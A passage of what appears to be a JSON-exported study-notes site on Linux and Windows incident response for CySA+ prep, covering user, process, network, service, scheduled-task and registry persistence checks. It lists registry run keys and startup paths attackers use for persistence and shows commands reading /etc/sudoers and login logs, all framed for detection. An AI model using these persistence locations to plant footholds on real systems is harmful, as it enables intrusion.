group is certainly suspicious. Some of the critical groups are as stated below:\n\n\nroot\n\n\nadm\n\n\nshadow\n\n\nsudo\n\n\nAnother file that needs to be checked in order to understand the authorizations of users or groups is “/etc/sudoers”. There is information on which users and groups can use sudo authority to what extent on this file.\n\n\n\n\n\n\n\n\n\n\n\ncat /etc/sudoers\n\nIn the sudoers file, unauthorized users and the sudo authorizations that may cause a system compromise should not be defined. In addition, incorrect configurations on this file should be determined.\nYou can list group processes by searching for the words “groupadd” and “usermod” in the auth.log file. Listing the group changes in the date range of the attack will make it easier to track the actions taken by the attacker.\n\n\n\n\n\n\n\n\n\n\n\ngrep groupadd /var/log/auth.log\n\n\n\n\n\n\n\n\n\n\n\n\ngrep usermod /var/log/auth.log\n\nIdentifying Users That Have Logged into the System\nWith the help of some tools that are installed by default in most linux systems, users with an active connection on the operating system can be listed. We recommend installing as few new tools as possible in order to preserve the integrity of the device during the incident response process. There are several different tools that we can use to detect logon users on GNU/Linux.\nThe w, who, users and last tools are included by default in GNU/Linux. With the help of these tools, you can identify users who have logged into the system.\nThese tools have their own advantages and disadvantages. However, choosing the “last” tool will speed up the incident response process, as it provides more information and historical data. If no parameter is given, it will give the login history of all users.\n\n\n\n\n\n\n\n\n\n\n\nlast\n\nThe last command obtains this information from the “/var/log/wtmp” file. You can get the same information by reading this file, but the last command provides it in a more readable format.\n\n\n\n\n\n\n\n\n\n\n\ncat /var/log/wtmp\n\nThe /var/log/auth.log file can be examined to detect users logged into the system via SSH. This file includes successful logins as well as unsuccessful logons. In this way, we can detect brute-force attacks from within the auth.log file.\nYou can list the failed login attempts with the following command.\n\n\n\n\n\n\n\n\n\n\n\ngrep “Failed password” /var/log/auth.log\n\nAs an alternative, failed SSH logins can be determined with the journalctl command.\n\n\n\n\n\n\n\n\n\n\n\njournalctl _SYSTEMD_UNIT=ssh.service | egrep “Failed|Failure”\nIdentification of Users That Can Conduct SSH\nDuring the incident response it may be necessary to detect users who can remotely conduct SSH to the device. You can learn about users who can conduct RDP on Windows operating systems by listing the users included in the “Remote Desktop Users” group. However, there is no similar group on Linux. The following steps should be followed in order to detect users who can conduct SSH.\n\n\nBy reading the /etc/passwd file, the users on the system are detected.\n\n\nUsers who do not have a valid shell are removed from the list.\n\n\nUsers who do not have valid passwords are removed from the list.\n\n\nUsers with SSH permissions are detected in /etc/ssh/sshd_config. If “AllowUsers” is specified in this file, it means that other users cannot use the SSH service.\n\n\nEradication\nAt the end of the incident response, the system must be restored to its working condition in a way that has not been affected by the cyber-attack.\nUsers added by the attacker should be deleted from the system. You can delete the user and the user’s home directory with the following command.\n\n\n\n\n\n\n\n\n\n\n\nuserdel -r USERNAME\n\nUnauthorized users should be removed from groups with high authorizations. You can remove the user from the group with the command below.\n\n\n\n\n\n\n\n\n\n\n\ngpasswd -d USERNAME GROUP\n\nThe sudo authorization given to the user must be removed. You can edit sudo authorizations with the visudo command.\n\n\n\n\n\n\n\n\n\n\n\nvisudo\n\nPasswords of users that should not be deleted should be changed and their SSH keys should be regenerated.  \nYou can use the passwd command to change the user’s password.\n\n\n\n\n\n\n\n\n\n\n\npasswd USERNAME\n\nIn order to regenerate the user’s SSH Keys, the old keys must be deleted first. Then a new SSH Key must be created."},"SOC/Cysa+-Prep/Incident-Response-on-Linux/index":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Linux/index","filePath":"SOC/Cysa+ Prep/Incident Response on Linux/index.md","title":"index","links":["SOC/Cysa+-Prep/Incident-Response-on-Linux/How-to-Create-Incident-Response-Plan","SOC/Cysa+-Prep/Incident-Response-on-Linux/Incident-Response-Procedure","SOC/Cysa+-Prep/Incident-Response-on-Linux/3-Important-Things","SOC/Cysa+-Prep/Incident-Response-on-Linux/Users-and-Groups","SOC/Cysa+-Prep/Incident-Response-on-Linux/Processes","SOC/Cysa+-Prep/Incident-Response-on-Linux/Files-and-File-System","SOC/Cysa+-Prep/Incident-Response-on-Linux/Mounts","SOC/Cysa+-Prep/Incident-Response-on-Linux/Network","SOC/Cysa+-Prep/Incident-Response-on-Linux/Service","SOC/Cysa+-Prep/Incident-Response-on-Linux/Crontab","SOC/Cysa+-Prep/Incident-Response-on-Linux/SSH-Authorized-Keys","SOC/Cysa+-Prep/Incident-Response-on-Linux/Bash_rc--and--Bash_profile","SOC/Cysa+-Prep/Incident-Response-on-Linux/Useful-Log-Files"],"tags":[],"content":"1. How to Create Incident Response Plan\n2. Incident Response Procedure\n3. 3 Important Things\n4. Users and Groups\n5. Processes\n6. Files and File System\n7. Mounts\n8. Network\n9. Service\n10. Crontab\n11. SSH Authorized Keys\n12. Bash_rc &amp; Bash_profile\n13. Useful Log Files"},"SOC/Cysa+-Prep/Incident-Response-on-Windows/3-Important-Things":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Windows/3-Important-Things","filePath":"SOC/Cysa+ Prep/Incident Response on Windows/3 Important Things.md","title":"3 Important Things","links":[],"tags":[],"content":"When analyzing a system that has been hacked or believed to have been hacked, regardless of the processing system, there are 3 questions that must be answered. The responses to these questions may change or end the continuation of the analysis.\n\n\nIs there a malware that is actively in the system?\nIs there any suspicious internal or external communication?\nIs there any persistence?\n\nIs there a malware that is actively in the system?\nIf there is anything malicious that is actively running in the system, you may conduct a backward analysis to investigate how it came there in the first place. The easiest way to do this is conducting a process analysis. We will teach you the details of process analysis in the future. However, to give a short example: a “powershell.exe” childprocess under an “excel.exe” process is suspicious and must be investigated.\nIs there any suspicious internal or external communication?\nAn attacker must form an interaction with the server in order complete procedures like controlling the system or extracting data from it. This interaction will form network traffic. An anomaly determination can be conducted by analyzing the connections made in that system currently and in the past. For example, in the case of a connection being established with an IP with a bad reputation, or data traffic at rates of large GBs between a certain IP, or connections made between abnormal ports can be cases that should be carefully investigated.\nIs there any persistence?\nWhen the actions of the attacker until this day are observed, it can clearly be seen that the attacker aims to be permanently present in the system that has been taken over. The reason behind this can be the fact that the attacker may not have been able to complete a certain transaction quickly and may need to return to complete it later and the thought that he/she should leave an open door because he/she might need it in the future again.\nDuring your analysis, you may not be able to determine an active malicious presence or suspicious traffic. Maybe the attacker has kept a backdoor that can trigger itself once a week. Thus, you must know the procedures used for permanence and you must examine these within the system.\nAnswering the 3 mentioned questions is important. The responses to these questions may change the continuation of the analysis. To answer these questions, there are certain places you must technically analyze. We will start talking about these in the upcoming chapter."},"SOC/Cysa+-Prep/Incident-Response-on-Windows/Additional-Solutions":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Windows/Additional-Solutions","filePath":"SOC/Cysa+ Prep/Incident Response on Windows/Additional Solutions.md","title":"Additional Solutions","links":[],"tags":[],"content":"After all the examinations are complete, we want to make sure that everything is proceeding as normal after the incident that occurred. Thus, each machine that was affiliated with the incident, or in fact, if possible, all of the devices located in the network, should have an EDR agent (paid or open source) applied, and all of the data should be tracked in a central server.\n\nThus, all the devices will be controlled from a single point. Thanks to the rule sets applied in the EDR, if there is to be any suspicious activity continuing, an alarm will form, and you will be aware of the situation.\nThe critical point here is the quality of the rule sets in the EDR. If you do not have rule sets that are able to detect suspicious activity, you will only be aware of basic activity that is occurring."},"SOC/Cysa+-Prep/Incident-Response-on-Windows/Checklist":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Windows/Checklist","filePath":"SOC/Cysa+ Prep/Incident Response on Windows/Checklist.md","title":"Checklist","links":[],"tags":[],"content":"Tools That Can Be Used\n\nProcess Hacker\nAutoruns\nFullEventLogView\nLastActivityView\nBrowsingHistoryView\n\nProcedures That Must be Conducted for Memory Analysis\n\nProcess Tree\nWeb Connections\nSignature Status\n\nUsers\n\nNet user\nLusrmgr.msc\nEvent ID 4720 - A user account was created\nEvent ID 4732 - A member was added to a security-enabled local group\n\nScheduled Tasks\n\nAutoruns, Event Viewer\nEvent ID 4698 - A scheduled task was created\nEvent ID 4702 - A scheduled task was updated\nApplications and Services Logs-Microsoft-Windows-TaskScheduler Operational.evtx\n\nServices\nRegistry Run Keys / Startup Folder\n\nEvent ID 4657: A registry value was modified\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserShellFolders\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellFolders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellFolders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserShellFolders\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\nFiles\n\nAV scan\nManual Search\n"},"SOC/Cysa+-Prep/Incident-Response-on-Windows/Files":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Windows/Files","filePath":"SOC/Cysa+ Prep/Incident Response on Windows/Files.md","title":"Files","links":[],"tags":[],"content":"One of the most basic methods of maintaining persistence is to leave a malicious file within the system. This malicious file left in the system may aim to steal data from the file, open a backdoor, etc.\nSince there are a very large number of files within the system, it is impossible to check each one. Thus, there are two methods we can use.\nManual Control\nIf we know the timeframe in which the incident occurred, we can list the files that have been created/organized during this timeframe and lower the number of files to be investigated.\nWe can list the files that need to be investigated by choosing the timeframe of the event by use of the “Date modified” section that is located in the “Search” tab in “File Explorer”.\n\nIn order to proceed more quickly through the results, we can start by primarily investigating the common extensions like “.bat” and “.exe”.\nThe difficulty of this stage is the manual execution of proceed. However, AV evasion techniques will not work here, as it will be examined with the human eye.\nAutomatic Control\nWith this method, we can use programs like AntiVirus or malware scanners to conduct a search within the entirety of the disk. Thus, both previous and newly created files will be automatically scanned.\nSince there will be no alert relating to malwares that have bypassed the AV, we cannot trust the scan to the extent of 100%."},"SOC/Cysa+-Prep/Incident-Response-on-Windows/Free-Tools-That-Can-Be-Used":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Windows/Free-Tools-That-Can-Be-Used","filePath":"SOC/Cysa+ Prep/Incident Response on Windows/Free Tools That Can Be Used.md","title":"Free Tools That Can Be Used","links":[],"tags":[],"content":"There are numerous free tools that can be used during the incident response process. Even though some procedures can be done manually, it is important that you use these tools to speed up the process, because with certain cases, we may be racing against time. During the scope of this education, we will use some free to use tools. Some of these are:\nProcess Hacker\nIs a tool that can be used to analyze the active working processes in the system in detail. Download: processhacker.sourceforge.io/downloads.php\nFullEventLogView\nCollects the Windows event logs in a single window. May collect proof about correct filters that are to be applied especially when the attack time frame is known. Download: www.nirsoft.net/utils/full_event_log_view.html\nAutoruns\nIs Microsoft sysinternal tool. Helps determine the attacker’s persistence actions. Download: docs.microsoft.com/en-us/sysinternals/downloads/autoruns\nLastActivityView\nSorts activities that have occurred on devices with the data it has collected from various sources. May be very beneficial when a specific time filter is applied. Download: www.nirsoft.net/utils/computer_activity_view.html\nBrowsingHistoryView\nReads the history of the web search engine on the device and shows it on a single screen. May be used to determine attacks like phishing and web exploit. Download: www.nirsoft.net/utils/browsing_history_view.html\nNote: As we have mentioned before, there are different equivalent tools that can be used. It’s not the tool we use that’s important, but it’s what we analyze/control with those tools. You can even code your own tool."},"SOC/Cysa+-Prep/Incident-Response-on-Windows/How-to-Create-Incident-Response-Plan":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Windows/How-to-Create-Incident-Response-Plan","filePath":"SOC/Cysa+ Prep/Incident Response on Windows/How to Create Incident Response Plan.md","title":"How to Create Incident Response Plan","links":[],"tags":[],"content":"What is incident response?\nIncident response is an approach to managing a security incident process. An incident response plan is needed to approach security incidents systematically. A successful incident response plan includes the following 6 stages:\n1- Preparation\n2- Identification\n3- Scope\n4- Eradication\n5- Recovery\n6- Lessons Learned\n1- Preparation\nCreating a Central Registration System\nIt is important in terms of saving time that all data can be examined from a single point with a central log collection system that can manage large files.\nTime Synchronization\nEnabling NTP on all devices in the network is important for matching the time information of the logs collected.\nUser Account Management\nThe fact that the user names of different accounts belonging to personnel are the same and different from other personnel makes it easy to monitor user activities in the event of an incident.\nManagement of System and Service Accounts\nThe administrators of the services and systems used should be appointed and a document should be created on how to reach these managers if needed.\nAsset Management\nInstant access to information such as devices, operating systems, patch versions, and critical status should be available.\nSecure Communication\nIf necessary, the team may need to communicate independently of the internal network, for such cases mobile phone or secondary emails can be used.\nLegal Transactions\nThe method of who will initiate the judicial process and in which situations should be determined before the incident occurs.\n2- Identification\nReview\nFor a potential suspicious incident, preliminary information about the incident should be gathered. Then it must be decided whether the situation is a suspicious event or not.\nAssignment\nThe first person to examine the incident must be determined. The person should take notes about the review.\nUsing the Checklist\nThere should be checklists for the analysis to be made in order to ensure consistent responses to incidents.\n3- Scope\nCharacterize the event\nSince determining the event will determine the actions to be taken, it is important to determine the type of the incoming event. EX: DDoS, malware infection, data leak …\nTaking Action\nAction should be taken according to the technique used to intercept the attacker’s method quickly. If there is an account that it has captured, simple measures such as account deactivation and IP blocking should be done quickly.\nData collecting\nThe image of the volatile memory along with the firewall, network traffic and other logs will be required for the investigation.\nIsolation\nUnplugging the compromised system could be a solution, isolating it is a more viable solution.\nAfter the systems affected by the incident are determined, the possibility of the attacker’s spread in the network is cut and volatile information is collected, the next step can begin.\n4- Eradication\nIdentifying the Root Cause\nWith the information obtained in the 2nd and 3rd stages, the root cause of the event should be determined. The attacker must then be completely eliminated.\nDetermining Rootkit Potential\nIf rootkits are suspected in the system, the disk should be cleaned and a clean backup installed. After the installation, the latest updates of the existing applications and systems should be installed.\nImprove Defense\nOperating systems, applications used, network, DMZ etc. The deficiencies of defense in areas should be determined and work should be done on how to make improvement.\nVulnerability Scan\nPotential attack points on networks and systems should be identified and corrected by performing vulnerability scans.\nWhen the necessary arrangements are prepared to prevent the event from recurring, the recovery phase can be started.\n5- Recovery\nVerification\nVerify that logging, systems, applications, databases, and other operations work correctly.\nRestore At this stage, the restore operation is coordinated.\nMonitoring\nSystems should be monitored for recurring events.\nWhen there is no repetitive harmful situation or unusual activity, the next step is taken.\n6- Lessons Learned\nWriting a Follow-up Report\nThe report includes the examinations with the expert and the executive, the stages of good and bad working in the intervention plan, and the recommendations regarding the process. The report should be written in a way that the manager is sure that the event has been closed."},"SOC/Cysa+-Prep/Incident-Response-on-Windows/Incident-Response-Procedure":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Windows/Incident-Response-Procedure","filePath":"SOC/Cysa+ Prep/Incident Response on Windows/Incident Response Procedure.md","title":"Incident Response Procedure","links":[],"tags":[],"content":"How Does the Procedure Proceed?\nIn a SOC (Security Operation Center) environment, the action taken against an incident is important. Everyone should not use their own method they came up with, but methods that have had their frameworks previously determined should be used so there is consistency and everything proceeds accurately during a time of crisis. In this section, we will talk about how we can keep the base of consistency in response to incidents. This section is important to understand the big picture.\n\nAlert\nAfter the logs collected through the EDR, IDS, IPS, WAF, and similar security tools that are found in the SOC, rule correlation sets are formed through the SIEM to determine suspicious activity. Thus, in the case of an unwanted situation, a new alert is created.\nAnalyze\nIn an ideal SOC environment, there are Tier 1 analysts present to conduct the preliminary analysis on alerts that come through the security tools. This analyst analyzes the incoming alert and determines whether it is a false positive or not. For example, an alert can be formed after sending a request to a malicious URL address; however, the URL address is not actually malicious. The Tier 1 analyst controls this procedure and eliminates incoming alerts.\nInvestigate\nAfter it is determined that the incoming alert is not a false positive, the investigation procedure begins, and the source of the attack is investigated. In addition, the amount of progress the attacker has made since the beginning of the attack is investigated.\nAssess Impact\nThe systems that have been affected by the attack are determined and the amount of damage present in the current situation is assessed and evaluated. For example, in a system that has been affected by ransomware may not have had all its data encrypted. Determinations similar to this have to be conducted to have an assessment of the current situation.\nContain\nAfter determining the systems affected from the attack, it is crucial that the situation is handled with control and prevented from spreading. Thus, the affected devices must immediately be isolated from the network. Let’s continue with the ransomware example. A dangerous ransomware will want to spread itself to other devices. In order to prevent the interaction with the other devices, the device must be isolated from the network.\nRespond\nAfter all the mentioned steps above are completed, the response process is initiated. At this step, the root cause of the situation is determined, the present dangers are removed, the systems are brought back to a working state, and lessons are made from the situation that has occurred. The main topic of this training will be the details listed under this title. In future topics, we have showed you how to do this with details."},"SOC/Cysa+-Prep/Incident-Response-on-Windows/Live-Memory-Analysis---1":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Windows/Live-Memory-Analysis---1","filePath":"SOC/Cysa+ Prep/Incident Response on Windows/Live Memory Analysis - 1.md","title":"Live Memory Analysis - 1","links":[],"tags":[],"content":"The best way to identify a malicious activity that is actively running in the system is to conduct a memory analysis. If the attacker(s) is accessing the system remotely at that moment, and if he/she is stealing data or making an interaction in any way, there is a process that is allowing this. To identify the process allowing this, a memory analysis can be conducted.\nWhile explaining this topic, we will benefit from the “Process Hacker” tool. As we have explained before, there are different equivalent tools like this. The important thing is to know what to control, not what tool we use.\nNOTE: You should run as Administrator to access all data!\n\nThe Process Hacker tool presents very detailed data regarding the processes in the system. Above, you can see the process relations, PID numbers, and the user information running in its most basic form.\nLet’s return to the analysis. There are 3 critical points we must pay attention to while conducting a memory analysis:\n\nProcess Tree\nNetwork Connections\nSignature Status\n\nProcess Tree\nIt is important to know what the normal statuses are while conducting a memory analysis. For example, it is normal to have a “chrome.exe” named childprocess under the “chrome.exe” process because it may create different subprocesses for different tabs.\n\nWhat if we saw a “powershell.exe” process that has been created under the “chrome.exe” process? We cannot react normally to a PowerShell creation under a chrome process. We must suspect an exploitation situation and examine what the PowerShell has done and what commands it invited.\nExample 1 – WebShell Detection\nLet’s take a look at the process tree below. A “powershell.exe: childprocess has been created under a process owned by the web server. It could have been “cmd.exe” instead of a PowerShell. Following, a “whoami” and “net user” command was run. We cannot expect a PowerShell to run under a web server process other than extraordinary circumstances. In addition, we definitely cannot expect any enumeration commands to run on top of this.\n\nWe can come to this result in this situation: If a cmd or a PowerShell process has been created under a web server process, we must suspect a webshell and investigate it.\nExample 2 – Malicious Macro Detection\nLet’s think of the “Winword.exe” process. We know it is created when a word document is opened. Is it normal for a powershell.exe to form under a Winword.exe process? What if, in fact, this PowerShell is being run with a command encoded with base64. This situation is not normal and is most probably created due to a file with a malicious macro embedded in it being opened.\n\nChecking With Process Hacker\nWe theoretically mentioned how we can identify suspicious activity that derive from a process tree with various examples. How can we check for these on a real machine?\n\nWhen we look at the situation above, we can see that python.exe has been formed under cmd.exe. This situation may be legal but may also have run a malicious python command. In order to understand this, we must double-click on “python.exe” and check which file/command was run within which parameters.\n\nWhen we look at the “command line” area, we see that the manage.py file was run within the parameters of “runserver” and in “current directory” we can see where the procedure was conducted. We cannot definitely say that there is a suspicious situation here. In order to understand whether the situation is suspicious or malicious, we must analyze the “manage.py” file. As seen, this file is located at “C:\\Users\\gunal\\Documents\\Github\\LetsDefend\\letsdefend\\”\nThe network connections and signature status points that must be checked during a memory analysis will be explained in the next part."},"SOC/Cysa+-Prep/Incident-Response-on-Windows/Live-Memory-Analysis---2":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Windows/Live-Memory-Analysis---2","filePath":"SOC/Cysa+ Prep/Incident Response on Windows/Live Memory Analysis - 2.md","title":"Live Memory Analysis - 2","links":[],"tags":[],"content":"In the second section of memory analysis, we will examine the “Network connections” and “Signature status” situations.\nNetwork Connections\nAttacker(s) need to leave a backdoor in order to access the device remotely and steal data. In order to identify this backdoor, we must check the active network connections during our analysis. The topics we need to be careful about here are process name, remote IP address and port number.\nInitially, we can see the processes creating the active network connection by opening the “Network” tab in Process Hacker.\n\nIn the “remote address” section, we can see what process has communicated with which address and we can see which port it has connected to through “Remote Port”. The first thing we need to check here is whether we have a process which we expect to make a connection. When we look at the image above, we see that Chrome, Discord and Evernote applications establish a network connection. When we look at the port information, we can understand that the connection was made through port 443. In the initial analysis we conducted, we were not able to identify any unnatural processes or a port that is not commonly used. If our suspicions are ongoing, we can conduct a search regarding the IP address at reputable sources like VirusTotal, AbuseIPDB.\nSignature Status\nAnother way to identify suspicious events is to check whether the file running the service is signed or not. The fact that a file is signed does not always mean it is legal. The most prominent example to this is the recent incident of SolarWinds. In the SolarWinds incident, the attackers changed the source code before the software was published and the relevant units had signed the malicious code. Thus, a software that looked like it was owned by SolarWinds but was actually a malware was distributed in the public.\nOpen the “Process” section in Process Hacker and right click on the “Name” section that is right below it and click “Choose columns”. In the window that pops up, send the “verification status” and “Verified Signer” choices to the “Active Columns” section and click OK. Thus, you will be able to view the signature status of the files relating the actively running processes and by whom it was signed.\n\n\nWhat Did We Learn?\n\nDuring the memory analysis, we must carefully pay attention to the “Process Tree”, “Network Connections”, and “Signature Status” situations.\nHow we must use the Process Hacker tool for Live Memory Analysis\nHow to distinguish normal and suspicious situations.\n"},"SOC/Cysa+-Prep/Incident-Response-on-Windows/Registry-Run-Keys-or-Startup-Folder":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Windows/Registry-Run-Keys-or-Startup-Folder","filePath":"SOC/Cysa+ Prep/Incident Response on Windows/Registry Run Keys or Startup Folder.md","title":"Registry Run Keys or Startup Folder","links":[],"tags":[],"content":"Another important method that is used is to play with the “Registry” values or leaving a file in the “Startup” file. Thus, it is ensured that the requested file is run when a user opens a session.\nAccording to a study by MITRE, 100+ malicious software’s that APT groups utilize use this technique.\nStartup\nIn order to view the files added to the startup file, the indexes below must be checked.\n\n\nC:\\Users[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n\n\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\n\n\n\nRegistry Run Keys\nThe following run keys are created by default on Windows systems:\n● HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n● HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n● HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n● HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nThe following Registry keys can be used to set startup folder items for persistence:\n● HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserShellFolders\n● HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellFolders\n● HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellFolders\n● HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserShellFolders\nThe following Registry keys can control automatic startup of services during boot:\n● HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices Once\n● HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices Once\n● HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n● HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n● HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n● HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nSource: mitre.org\nDetection\nIf you do not want to check the registry values one by one, you can return to the “Autoruns” tool.\n\nHere, by opening the “Logon” and “Explorer” tabs, we can view the registry values that we have mentioned above. By checking the “Control Path” sections, we can check to see whether there is a suspicious file or not. If there are a high number of registry values in front of us, in order to save time, we can start by examining the registry values that do not have any values in the “Description” and “Publisher” sections.\nIf you were not able to find the findings you wanted with autoruns, you can check the “Event Log”s, when a registry value is changed, an “EventID 4657” log is created. You can continue your analysis by filtering the security logs.\nWhat Did We Learn?\n\nA user may manipulate the Startup file or the Registry values in order to run the requested file when a session is opened.\nWe can track registry changes with EventID 4657\nWe can detect suspicious Registry values with Autoruns\n"},"SOC/Cysa+-Prep/Incident-Response-on-Windows/Services":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Windows/Services","filePath":"SOC/Cysa+ Prep/Incident Response on Windows/Services.md","title":"Services","links":[],"tags":[],"content":"Attackers may create a new service or change a current service in order to run malicious commands. They may use legal code names like “Chrome Update” in order to make it difficult to identify the service they have created or changed. In order to detect a newly created service from Event Logs, the log with ID “4697: A service was installed in the system” can be used.\nIn addition to persistence, they constantly stop services like “Windows Defender”, “Firewall”, etc. that are run for safety precautions in order to easily conduct hacking activities.\nFor these reasons, when analyzing a Windows device, me must examine which services have been created/changed and which systems have been stopped."},"SOC/Cysa+-Prep/Incident-Response-on-Windows/Task-Scheduler":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Windows/Task-Scheduler","filePath":"SOC/Cysa+ Prep/Incident Response on Windows/Task Scheduler.md","title":"Task Scheduler","links":[],"tags":[],"content":"One of the most used persistence methods is to create scheduled tasks. Most malicious things from viruses to ransomware use scheduled tasks to maintain persistence. The attacker, by using scheduled tasks, ensures that the malicious file runs at regular intervals. Thus, the attacker ensures that the commands he/she wants to run are run actively and regularly. There are various ways to identify the actively present suspicious scheduled tasks that are running in the system. First, let’s show you how this is done by using “Autoruns”, which is a sysinternals tool.\nAutoruns: Download\nAutoruns\nWith the autoruns tool, we can identify commonly used permanence methods that attackers used like Registry, Startup, and Schedule Task. We run it as an intermediary admin and go to the “Scheduled Task” tab.\n\nWe do not have many scheduled tasks in front of us. When necessary, we can examine each one individually and identify the suspicious one. However, let’s think of what we can do if we have a high number of scheduled tasks, and we are racing against time. In order to conduct an initial elimination, we can start with scheduled tasks that do not have a “Publisher”. The fact that there is a publisher does not make it completely trustworthy, however, it is a higher probability that suspicious tasks do not have publishers.\n\nNow the number is down to 3. What we must do now is analyze the file located in the “image Path” that will run when the time comes.\nWhen the “important.bat” file is examined for the “Update-Daily” task, we can see that the commands below are run.\n\nThus, we see that the actual goal of the attacker is to create a user named “User123” and add it to a relevant group for it to be able to run an RDP. The attacker chose not to do this manually by hand, but with a scheduled task.\nTask Scheduler\nIn order to identify suspicious tasks, those that do not want to download the autoruns tool may use the default “Task Scheduler” that is present in the operating system.\n\nEven though there aren’t any additional pieces of information presented here similar to autoruns, when you click on the relevant task, you can see and analyze which file or command was run.\n\nCMD\nEven though it is not commonly preferred, if you do not have the chance to use an interface, you can view the scheduled tasks with the ‘schtasks’ command in the command line interface.\n\nDeleted Tasks\nWhat if after all inquiries we do not observe a suspicious task? Can the attacker have created a task that deletes itself after it runs?\nIn order to determine a situation like this, we must examine previous logs. Event logs will run to the rescue during situations like these. If you want to access relevant logs through Task Scheduler, you may do so through the “Applications and Services Logs-Microsoft-Windows-TaskScheduler Operational.evtx” section located in Task Scheduler.\n\nOr you may track the “Security” logs below:\nEvent ID 4698: A scheduled task was created\nEvent ID 4702: A scheduled task was updated\nFor example, in the log below, we can see that a scheduled task was created on the date 10/23/2021\n\nWhen we observe the “action” section, we can see the file/command that the task attempted to run. Even if this task is not currently active in the “Task Scheduler”, we have identified with a log analysis that this task was created in the past.\nWhat Did We Learn?\nWe talked about how we can identify suspicious activity in scheduled tasks which is a method that attackers commonly use. We also learned how we can detect tasks that are not currently active and have deleted themselves. Now you know what to do in situations like this and where to look. You can complete the practices below and solidify your theoretical information."},"SOC/Cysa+-Prep/Incident-Response-on-Windows/Users":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Windows/Users","filePath":"SOC/Cysa+ Prep/Incident Response on Windows/Users.md","title":"Users","links":[],"tags":[],"content":"A method that is commonly used by attackers to maintain persistence is to create users. In fact, maintaining persistence is not the only reason why this is conducted. We observe that when attacker(s) take control of the “Administrator” account, they create new users. Because this is an important user, and its activity may be regularly tracked. Thus, they create a new user that will not attract a lot of attention and, if possible, they increase that user’s privileges.\nThe users that are created usually include keywords like “support”, “sysadmin”, “admin”. In most companies, users with names like these will not attract much attention.\nDuring an incident response procedure, there are 2 things that we must quickly evaluate.\n\n\nIs there currently a user in the system that should not be there?\n\n\nHas a user been created during the attack and deleted after that?\n\n\nSuspicious User Detection\nTo list the currently active users in the system, we can use the “net user” command via cmd.\n\nAs a result, if there is a user that should not be there and we need more detailed information regarding this specific user, we can conduct a search my typing “net user USERNAME”.\n\nIn this example, if the “Last logon” and “Password last set” values are paired with the time of the attack, we can approach the situation with suspicion.\nAnother method is to maintain control through “lusrmgr”. For this, activate “run: with “Windows + R” and click OK by typing “lusrmgr.msc”\n\nIn the window that pops up, you can choose the “Users” group and list the users.\n\nIf you are suspicious of a user after this controller, you can focus on the activity of that user in your following analysis period.\nUsers That Have Been Created in The Past\nAttackers, after they create a user and conduct the relevant procedures, may delete users when they are done to minimize the trail left behind. In this case, we will not be able to view these users in the commands we conduct with “net user” or “lusrmgr”. What we must do is check within the “Security” logs to observe whether a user has been created in the past or not. To do this, we can use the log “Event ID 4720 – A user account was created”.\nAfter opening the “Security” logs with “Event Viewer”, we can filter the logs with Event ID “4720”.\n\n\nIn the window that pops up, we input “4720” as the Event ID.\n\n\nWhen we look at the result that appears, we can see that the user “LetsDefend” has created a user named 